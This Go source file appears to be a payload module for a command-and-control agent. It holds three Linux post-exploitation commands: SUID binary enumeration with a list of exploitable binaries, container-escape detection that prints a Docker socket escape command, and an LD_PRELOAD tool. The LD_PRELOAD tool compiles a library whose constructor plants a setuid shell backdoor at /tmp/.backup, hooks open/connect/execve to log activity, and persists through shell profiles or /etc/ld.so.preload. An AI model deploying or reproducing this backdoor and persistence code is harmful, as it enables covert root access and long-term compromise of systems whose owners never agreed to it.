// server/docker/payloads/Linux/action_suid_ldpreload_containers.go
//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"text/template"
)

// SUIDEnumCommand finds and analyzes SUID/SGID binaries
type SUIDEnumCommand struct{}

func (c *SUIDEnumCommand) Name() string {
	return "suid-enum"
}

func (c *SUIDEnumCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	var checkExploits bool
	var outputPath string
	var customPaths []string // ADD THIS LINE

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--check-exploits":
			checkExploits = true
		case "--output":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		case "--path": // ADD THIS CASE
			if i+1 < len(args) {
				customPaths = append(customPaths, args[i+1])
				i++
			}
		case "--help":
			return CommandResult{
				Output: "Usage: suid-enum [--check-exploits] [--output <file>] [--path <dir>]",
				ExitCode: 0,
			}
		}
	}

	// Known exploitable SUID binaries (GTFOBins subset)
	exploitableBins := map[string]string{
		"aria2c":            "Download files, read sensitive data",
		"arp":               "Read files via -v -f flag",
		"ash":               "Shell escape",
		"awk":               "Command execution via system()",
		"base64":            "Read any file",
		"bash":              "Shell with -p flag maintains privileges",
		"busybox":           "Multiple utilities, shell access",
		"cat":               "Read any file",
		"chmod":             "Change permissions on any file",
		"chown":             "Change ownership of any file",
		"cp":                "Copy and read files",
		"cpan":              "Perl execution",
		"cpulimit":          "Execute commands",
		"csh":               "Shell escape",
		"curl":              "Read files, data exfiltration",
		"cut":               "Read files",
		"dash":              "Shell escape",
		"date":              "Read files via -f flag",
		"dd":                "Read/write raw data",
		"diff":              "Read files",
		"dmesg":             "Read kernel messages",
		"dmsetup":           "Device manipulation",
		"docker":            "Container escape to root",
		"ed":                "Shell escape via !",
		"emacs":             "Shell escape",
		"env":               "Execute with modified environment",
		"expand":            "Read files",
		"expect":            "Shell escape",
		"file":              "Read files",
		"find":              "Execute commands via -exec",
		"flock":             "Execute commands",
		"fmt":               "Read files",
		"fold":              "Read files",
		"gawk":              "Command execution",
		"gdb":               "Shell escape, memory reading",
		"gimp":              "Script execution",
		"git":               "Shell escape via hooks",
		"grep":              "Read files",
		"head":              "Read files",
		"hexdump":           "Read files",
		"highlight":         "Read files",
		"iconv":             "Read files",
		"iftop":             "Shell escape",
		"ionice":            "Execute commands",
		"ip":                "Read files, command execution",
		"jjs":               "JavaScript execution",
		"jq":                "Read files",
		"jrunscript":        "Script execution",
		"ksh":               "Shell escape",
		"ld.so":             "Library loading",
		"less":              "Shell escape via !",
		"logsave":           "Execute commands",
		"ltrace":            "Execute commands",
		"lua":               "Script execution",
		"make":              "Execute commands",
		"man":               "Shell escape via !",
		"mawk":              "Command execution",
		"more":              "Shell escape via !",
		"mount":             "Mount filesystems",
		"mtr":               "Read files",
		"mv":                "Overwrite files",
		"mysql":             "Shell escape via \\!",
		"nano":              "Modify/read files",
		"nawk":              "Command execution",
		"nc":                "Network connections, shell",
		"nice":              "Execute commands",
		"nl":                "Read files",
		"nmap":              "Script execution",
		"node":              "JavaScript execution",
		"od":                "Read files",
		"openssl":           "Read files, crypto operations",
		"perl":              "Script execution",
		"pg":                "Shell escape",
		"php":               "Script execution",
		"pic":               "Shell escape",
		"pico":              "Modify/read files",
		"pip":               "Install packages, execute code",
		"python":            "Script execution",
		"python2":           "Script execution",
		"python3":           "Script execution",
		"rake":              "Ruby execution",
		"readelf":           "Read files",
		"rlwrap":            "Execute commands",
		"rpm":               "Script execution via triggers",
		"rpmquery":          "Read files",
		"rsync":             "Read/write files",
		"ruby":              "Script execution",
		"run-parts":         "Execute scripts in directory",
		"rvim":              "Shell escape",
		"scp":               "Read/write files",
		"screen":            "Shell escape",
		"script":            "Execute commands",
		"sed":               "Read/write files",
		"service":           "Start services",
		"setarch":           "Execute commands",
		"sftp":              "Read/write files",
		"sh":                "Shell escape",
		"shuf":              "Read files",
		"socat":             "Network operations, shell",
		"sort":              "Read files",
		"sqlite3":           "Shell escape via .shell",
		"ssh":               "Command execution",
		"start-stop-daemon": "Execute as different user",
		"stdbuf":            "Execute commands",
		"strace":            "Execute commands",
		"strings":           "Read file contents",
		"systemctl":         "Service manipulation",
		"tail":              "Read files",
		"tar":               "Read/write files, shell escape",
		"taskset":           "Execute commands",
		"tclsh":             "TCL execution",
		"tee":               "Write files",
		"telnet":            "Network connections",
		"tftp":              "Transfer files",
		"time":              "Execute commands",
		"timeout":           "Execute commands",
		"tmux":              "Shell escape",
		"ul":                "Read files",
		"unexpand":          "Read files",
		"uniq":              "Read files",
		"unshare":           "Namespace manipulation",
		"vi":                "Shell escape",
		"vim":               "Shell escape",
		"watch":             "Execute commands",
		"wget":              "Download files",
		"whois":             "Data exfiltration",
		"wish":              "TCL/TK execution",
		"xargs":             "Execute commands",
		"xxd":               "Read files",
		"zip":               "Read files",
		"zsh":               "Shell escape",
	}

	var results []string
	results = append(results, "=== SUID/SGID Binary Enumeration ===\n")

	// Search paths
	var searchPaths []string

	// Add custom paths if specified
	if len(customPaths) > 0 {
		results = append(results, fmt.Sprintf("[*] Scanning custom paths: %s\n", strings.Join(customPaths, ", ")))
		searchPaths = customPaths
	} else {
		// Only use default paths if no custom paths specified
		searchPaths = []string{
			"/usr/bin", "/usr/sbin",
			"/bin", "/sbin",
			"/usr/local/bin", "/usr/local/sbin",
			"/opt", "/snap/bin",
		}
	}

	suidBinaries := []string{}
	sgidBinaries := []string{}

	for _, searchPath := range searchPaths {
		if _, err := os.Stat(searchPath); os.IsNotExist(err) {
			continue
		}

		filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.IsDir() {
				return nil
			}

			// Check for SUID bit (4000)
			if info.Mode()&os.ModeSetuid != 0 {
				suidBinaries = append(suidBinaries, path)
			}

			// Check for SGID bit (2000)
			if info.Mode()&os.ModeSetgid != 0 {
				sgidBinaries = append(sgidBinaries, path)
			}

			return nil
		})
	}

	// Report SUID binaries
	results = append(results, fmt.Sprintf("\n[+] Found %d SUID binaries:", len(suidBinaries)))
	for _, binary := range suidBinaries {
		info, _ := os.Stat(binary)
		var owner string = "unknown"

		if stat, ok := info.Sys().(*syscall.Stat_t); ok {
			owner = fmt.Sprintf("uid=%d", stat.Uid)
		}

		result := fmt.Sprintf("  %s (owner: %s, perms: %s)",
			binary, owner, info.Mode().String())

		// Check if exploitable
		if checkExploits {
			baseName := filepath.Base(binary)
			if exploit, found := exploitableBins[baseName]; found {
				result += fmt.Sprintf("\n    [!] EXPLOITABLE: %s", exploit)
			}
		}

		results = append(results, result)
	}

	// Report SGID binaries
	results = append(results, fmt.Sprintf("\n[+] Found %d SGID binaries:", len(sgidBinaries)))
	for _, binary := range sgidBinaries {
		info, _ := os.Stat(binary)
		var group string = "unknown"

		if stat, ok := info.Sys().(*syscall.Stat_t); ok {
			group = fmt.Sprintf("gid=%d", stat.Gid)
		}

		result := fmt.Sprintf("  %s (group: %s, perms: %s)",
			binary, group, info.Mode().String())

		// Check if exploitable
		if checkExploits {
			baseName := filepath.Base(binary)
			if exploit, found := exploitableBins[baseName]; found {
				result += fmt.Sprintf("\n    [!] EXPLOITABLE: %s", exploit)
			}
		}

		results = append(results, result)
	}

	// Check for unusual SUID binaries
	commonSUIDs := map[string]bool{
		"sudo": true, "su": true, "passwd": true, "chsh": true,
		"chfn": true, "gpasswd": true, "newgrp": true, "mount": true,
		"umount": true, "pkexec": true, "fusermount": true, "ping": true,
		"traceroute": true, "crontab": true, "at": true,
	}

	results = append(results, "\n[*] Unusual SUID binaries (worth investigating):")
	for _, binary := range suidBinaries {
		baseName := filepath.Base(binary)
		if !commonSUIDs[baseName] {
			results = append(results, fmt.Sprintf("  [?] %s", binary))
		}
	}

	// Save to file if requested
	if outputPath != "" {
		output := strings.Join(results, "\n")
		if err := os.WriteFile(outputPath, []byte(output), 0600); err != nil {
			results = append(results, fmt.Sprintf("\n[-] Failed to write output: %v", err))
		} else {
			results = append(results, fmt.Sprintf("\n[+] Results saved to %s", outputPath))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// ContainerDetectCommand detects container environment and checks for escapes
type ContainerDetectCommand struct{}

func (c *ContainerDetectCommand) Name() string {
	return "container-detect"
}

func (c *ContainerDetectCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	var results []string
	results = append(results, "=== Container/Virtualization Detection ===\n")

	isContainer := false
	containerType := "none"
	escapeVectors := []string{}

	// 1. Check for /.dockerenv file (Docker)
	if _, err := os.Stat("/.dockerenv"); err == nil {
		isContainer = true
		containerType = "docker"
		results = append(results, "[+] Docker detected: /.dockerenv exists")
	}

	// 2. Check for /run/.containerenv (Podman)
	if _, err := os.Stat("/run/.containerenv"); err == nil {
		isContainer = true
		if containerType == "none" {
			containerType = "podman"
		}
		results = append(results, "[+] Podman detected: /run/.containerenv exists")
	}

	// 3. Check cgroup for container signatures
	if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		cgroupData := string(data)
		if strings.Contains(cgroupData, "docker") {
			isContainer = true
			containerType = "docker"
			results = append(results, "[+] Docker detected in /proc/1/cgroup")
		} else if strings.Contains(cgroupData, "lxc") {
			isContainer = true
			containerType = "lxc"
			results = append(results, "[+] LXC detected in /proc/1/cgroup")
		} else if strings.Contains(cgroupData, "kubepods") {
			isContainer = true
			containerType = "kubernetes"
			results = append(results, "[+] Kubernetes pod detected in /proc/1/cgroup")
		}
	}

	// 4. Check for container-specific environment variables
	containerEnvs := map[string]string{
		"KUBERNETES_SERVICE_HOST": "kubernetes",
		"KUBERNETES_PORT":         "kubernetes",
		"container":               "generic",
		"DOCKER_HOST":             "docker",
	}

	for env, ctype := range containerEnvs {
		if os.Getenv(env) != "" {
			isContainer = true
			if containerType == "none" {
				containerType = ctype
			}
			results = append(results, fmt.Sprintf("[+] Container environment detected: %s=%s",
				env, os.Getenv(env)))
		}
	}

	// 5. Check init process
	if data, err := os.ReadFile("/proc/1/comm"); err == nil {
		initProcess := strings.TrimSpace(string(data))
		if initProcess != "systemd" && initProcess != "init" {
			results = append(results, fmt.Sprintf("[*] Non-standard init process: %s (possible container)",
				initProcess))
		}
	}

	// 6. Check for limited capabilities
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "CapEff:") {
				results = append(results, fmt.Sprintf("[*] Effective capabilities: %s", line))
			}
		}
	}

	// Container escape checks
	if isContainer {
		results = append(results, fmt.Sprintf("\n[!] Running inside container: %s", containerType))
		results = append(results, "\n=== Checking for Escape Vectors ===")

		// Check for Docker socket
		dockerSockets := []string{
			"/var/run/docker.sock",
			"/run/docker.sock",
			"/host/var/run/docker.sock",
		}
		for _, socket := range dockerSockets {
			if info, err := os.Stat(socket); err == nil {
				if info.Mode()&os.ModeSocket != 0 {
					results = append(results, fmt.Sprintf("[!] Docker socket found: %s", socket))
					escapeVectors = append(escapeVectors, "docker-socket")

					// Check if we can access it
					if file, err := os.OpenFile(socket, os.O_RDWR, 0); err == nil {
						file.Close()
						results = append(results, "    [!!] Socket is accessible - escape possible!")
						results = append(results, "    Exploit: docker run -v /:/host --privileged -it ubuntu bash")
					} else {
						results = append(results, "    [-] Socket not accessible")
					}
				}
			}
		}

		// Check if privileged
		if _, err := os.Stat("/dev/kmsg"); err == nil {
			results = append(results, "[!] Privileged container detected: /dev/kmsg exists")
			escapeVectors = append(escapeVectors, "privileged")
		}

		// Check for dangerous capabilities
		if data, err := os.ReadFile("/proc/self/status"); err == nil {
			if strings.Contains(string(data), "CapEff:") {
				// Check for CAP_SYS_ADMIN (21), CAP_SYS_PTRACE (19), CAP_SYS_MODULE (16)
				results = append(results, "[*] Checking for dangerous capabilities...")
				// This is simplified - would need proper capability parsing
			}
		}

		// Check for host filesystem mounts
		if data, err := os.ReadFile("/proc/mounts"); err == nil {
			mounts := string(data)
			if strings.Contains(mounts, "/host") || strings.Contains(mounts, "hostPath") {
				results = append(results, "[!] Host filesystem mounted")
				escapeVectors = append(escapeVectors, "host-mount")
			}
		}

		// Check for excessive PIDs (container vs host)
		if files, err := os.ReadDir("/proc"); err == nil {
			pidCount := 0
			for _, file := range files {
				if _, err := strconv.Atoi(file.Name()); err == nil {
					pidCount++
				}
			}
			results = append(results, fmt.Sprintf("[*] Process count: %d", pidCount))
			if pidCount > 100 {
				results = append(results, "    [*] High process count - might be seeing host processes")
			}
		}

		// Kubernetes specific checks
		if containerType == "kubernetes" {
			// Check for service account token
			tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
			if _, err := os.Stat(tokenPath); err == nil {
				results = append(results, "[+] Kubernetes service account token found")
				escapeVectors = append(escapeVectors, "k8s-token")
			}

			// Check for kubectl
			if _, err := exec.LookPath("kubectl"); err == nil {
				results = append(results, "[+] kubectl binary found")
			}
		}
	} else {
		results = append(results, "\n[*] Not running in a container (or container not detected)")
	}

	// Summary
	if len(escapeVectors) > 0 {
		results = append(results, fmt.Sprintf("\n[!!] Potential escape vectors found: %s",
			strings.Join(escapeVectors, ", ")))
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// LDPreloadCommand manages LD_PRELOAD injection
type LDPreloadCommand struct{}

func (c *LDPreloadCommand) Name() string {
	return "ld-preload"
}

func (c *LDPreloadCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: ld-preload <action> [options]",
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "generate":
		if len(args) < 2 {
			return CommandResult{
				Output:   "Usage: ld-preload generate <output.so> [--hook <function>]",
				ExitCode: 1,
			}
		}
		return c.generateLibrary(args[1:])

	case "inject":
		if len(args) < 3 {
			return CommandResult{
				Output:   "Usage: ld-preload inject <target> <library.so>",
				ExitCode: 1,
			}
		}
		return c.injectLibrary(args[1], args[2])

	case "persist":
		if len(args) < 2 {
			return CommandResult{
				Output:   "Usage: ld-preload persist <library.so> [--user]",
				ExitCode: 1,
			}
		}
		return c.persistLibrary(args[1:])

	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown action: %s", action),
			ExitCode: 1,
		}
	}
}

func (c *LDPreloadCommand) generateLibrary(args []string) CommandResult {
	outputPath := args[0]
	hookFunc := "open" // default hook

	// Parse options
	for i := 1; i < len(args); i++ {
		if args[i] == "--hook" && i+1 < len(args) {
			hookFunc = args[i+1]
			i++
		}
	}

	// C source template for the shared library
	sourceTemplate := `
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

// Constructor - runs when library is loaded
__attribute__((constructor)) void init(void) {
    // Silent backdoor - create setuid file for persistence
    char *path = "/tmp/.backup";
    FILE *f = fopen(path, "w");
    if (f) {
        fprintf(f, "#!/bin/sh\n/bin/sh\n");
        fclose(f);
        chmod(path, 04755);
    }
}

{{if eq .HookFunc "open"}}
// Hook open() system call
typedef int (*orig_open_t)(const char *pathname, int flags, ...);

int open(const char *pathname, int flags, ...) {
    orig_open_t orig_open = (orig_open_t)dlsym(RTLD_NEXT, "open");
    
    // Log file access (could exfiltrate)
    if (strstr(pathname, "passwd") || strstr(pathname, "shadow")) {
        FILE *log = fopen("/tmp/.access.log", "a");
        if (log) {
            fprintf(log, "ACCESS: %s by uid=%d\n", pathname, getuid());
            fclose(log);
        }
    }
    
    // Call original function
    return orig_open(pathname, flags);
}
{{else if eq .HookFunc "connect"}}
// Hook connect() for network monitoring
typedef int (*orig_connect_t)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    orig_connect_t orig_connect = (orig_connect_t)dlsym(RTLD_NEXT, "connect");
    
    // Log network connections
    FILE *log = fopen("/tmp/.network.log", "a");
    if (log) {
        fprintf(log, "CONNECT: fd=%d\n", sockfd);
        fclose(log);
    }
    
    return orig_connect(sockfd, addr, addrlen);
}
{{else if eq .HookFunc "execve"}}
// Hook execve() for command monitoring
typedef int (*orig_execve_t)(const char *pathname, char *const argv[], char *const envp[]);

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    orig_execve_t orig_execve = (orig_execve_t)dlsym(RTLD_NEXT, "execve");
    
    // Log command execution
    FILE *log = fopen("/tmp/.exec.log", "a");
    if (log) {
        fprintf(log, "EXEC: %s by uid=%d\n", pathname, getuid());
        fclose(log);
    }
    
    return orig_execve(pathname, argv, envp);
}
{{else}}
// Generic hook template
typedef void* (*orig_{{.HookFunc}}_t)();

void* {{.HookFunc}}() {
    orig_{{.HookFunc}}_t orig_func = (orig_{{.HookFunc}}_t)dlsym(RTLD_NEXT, "{{.HookFunc}}");
    // Add hook logic here
    return orig_func();
}
{{end}}
`

	// Parse template and generate C source
	tmpl, err := template.New("source").Parse(sourceTemplate)
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to parse template: %v", err),
			ExitCode: 1,
		}
	}

	var source bytes.Buffer
	data := struct {
		HookFunc string
	}{
		HookFunc: hookFunc,
	}

	if err := tmpl.Execute(&source, data); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to generate source: %v", err),
			ExitCode: 1,
		}
	}

	// Write C source to temp file
	sourceFile := "/tmp/hook_source.c"
	if err := os.WriteFile(sourceFile, source.Bytes(), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to write source: %v", err),
			ExitCode: 1,
		}
	}

	// Compile shared library
	cmd := exec.Command("gcc", "-shared", "-fPIC", "-o", outputPath, sourceFile, "-ldl")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Compilation failed: %v\n%s", err, output),
			ExitCode: 1,
		}
	}

	// Clean up source file
	os.Remove(sourceFile)

	// Set appropriate permissions
	os.Chmod(outputPath, 0755)

	return CommandResult{
		Output: fmt.Sprintf(`[+] Generated LD_PRELOAD library: %s
[*] Hooked function: %s
[*] Backdoor will create: /tmp/.backup (setuid shell)
[*] Logs will be written to: /tmp/.*.log

Usage:
  LD_PRELOAD=%s <command>
  export LD_PRELOAD=%s`, outputPath, hookFunc, outputPath, outputPath),
		ExitCode: 0,
	}
}

func (c *LDPreloadCommand) injectLibrary(target string, library string) CommandResult {
	// Verify library exists
	if _, err := os.Stat(library); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Library not found: %s", library),
			ExitCode: 1,
		}
	}

	// Get absolute path
	absLibrary, _ := filepath.Abs(library)

	// Set LD_PRELOAD and execute target
	cmd := exec.Command(target)
	cmd.Env = append(os.Environ(), fmt.Sprintf("LD_PRELOAD=%s", absLibrary))

	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[*] Executed: %s with LD_PRELOAD=%s\n", target, absLibrary)
	result += "[*] Output:\n" + string(output)

	if err != nil {
		result += fmt.Sprintf("\n[!] Command failed: %v", err)
	}

	return CommandResult{
		Output:   result,
		ExitCode: 0,
	}
}

func (c *LDPreloadCommand) persistLibrary(args []string) CommandResult {
	library := args[0]
	userMode := false

	for _, arg := range args[1:] {
		if arg == "--user" {
			userMode = true
		}
	}

	// Verify library exists
	if _, err := os.Stat(library); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Library not found: %s", library),
			ExitCode: 1,
		}
	}

	// Get absolute path
	absLibrary, _ := filepath.Abs(library)

	if userMode {
		// Add to user's shell profile
		homeDir := os.Getenv("HOME")
		profiles := []string{
			filepath.Join(homeDir, ".bashrc"),
			filepath.Join(homeDir, ".profile"),
			filepath.Join(homeDir, ".zshrc"),
		}

		var results []string
		for _, profile := range profiles {
			if _, err := os.Stat(profile); err == nil {
				// Append export to profile
				content := fmt.Sprintf("\nexport LD_PRELOAD=%s\n", absLibrary)

				file, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
				if err != nil {
					results = append(results, fmt.Sprintf("[-] Failed to modify %s: %v", profile, err))
					continue
				}
				defer file.Close()

				if _, err := file.WriteString(content); err != nil {
					results = append(results, fmt.Sprintf("[-] Failed to write to %s: %v", profile, err))
				} else {
					results = append(results, fmt.Sprintf("[+] Added to %s", profile))
				}
			}
		}

		return CommandResult{
			Output:   strings.Join(results, "\n"),
			ExitCode: 0,
		}
	} else {
		// System-wide persistence via /etc/ld.so.preload
		ldPreloadFile := "/etc/ld.so.preload"

		// Check if we have write access
		file, err := os.OpenFile(ldPreloadFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Cannot write to %s: %v (need root)", ldPreloadFile, err),
				ExitCode: 1,
			}
		}
		defer file.Close()

		// Add library path
		if _, err := file.WriteString(absLibrary + "\n"); err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Failed to write: %v", err),
				ExitCode: 1,
			}
		}

		return CommandResult{
			Output:   fmt.Sprintf("[+] Added %s to %s\n[!] Will affect ALL processes system-wide", absLibrary, ldPreloadFile),
			ExitCode: 0,
		}
	}
}
